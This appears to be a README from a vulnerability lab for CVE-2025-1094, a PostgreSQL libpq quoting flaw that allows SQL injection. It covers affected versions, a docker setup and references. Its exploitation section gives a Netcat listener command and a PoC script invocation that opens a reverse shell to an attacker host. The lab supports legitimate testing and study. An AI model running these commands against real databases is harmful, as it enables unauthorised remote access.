# CVE-2025-1094
Improper neutralization of quoting syntax in PostgreSQL libpq functions PQescapeLiteral(), PQescapeIdentifier(), PQescapeString(), and PQescapeStringConn() allows a database input provider to achieve SQL injection in certain usage patterns. Specifically, SQL injection requires the application to use the function result to construct input to psql, the PostgreSQL interactive terminal. Similarly, improper neutralization of quoting syntax in PostgreSQL command line utility programs allows a source of command line arguments to achieve SQL injection when client_encoding is BIG5 and server_encoding is one of EUC_TW or MULE_INTERNAL. Versions before PostgreSQL 17.3, 16.7, 15.11, 14.16, and 13.19 are affected.

## Metrics
CVSSv3: 8.1 (HIGH)

## Vulnerability Environment
Build and run:
```bash
docker compose build
docker compose up -d
```
Stop Environment and remove network:
```bash
docker compose down
```
## Detection and exploitation example
Start a Netcat listener to listen for shell connections.
```shell
nc -lvnp 4444
```
Run the PoC script to obtain a remote shell.
```shell
python3 CVE_2025_1094.py --host 172.90.240.1 -p 5432 -d testdb -u postgres --password postgres --lhost 192.168.93.63 --lport 4444
```
## Exploits and PoCs
https://hackyboiz.github.io/2025/04/30/clalxk/CVE-2025-1094/  
## Nuclei Template

## CTF Rooms

## References
[NIST: CVE-2025-1094](https://nvd.nist.gov/vuln/detail/cve-2025-1094)
[Hackyboiz: [One line a day] CVE-2025-1094: RCE due to SQL injection vulnerability in PostgreSQL 14.15](https://hackyboiz.github.io/2025/04/30/clalxk/CVE-2025-1094/)  
[Hackernews: PostgreSQL Vulnerability Exploited Alongside BeyondTrust Zero-Day in Targeted Attacks](https://thehackernews.com/2025/02/postgresql-vulnerability-exploited.html)  
[Rapid7: CVE-2025-1094: PostgreSQL psql SQL injection (FIXED)](https://www.rapid7.com/blog/post/2025/02/13/cve-2025-1094-postgresql-psql-sql-injection-fixed/)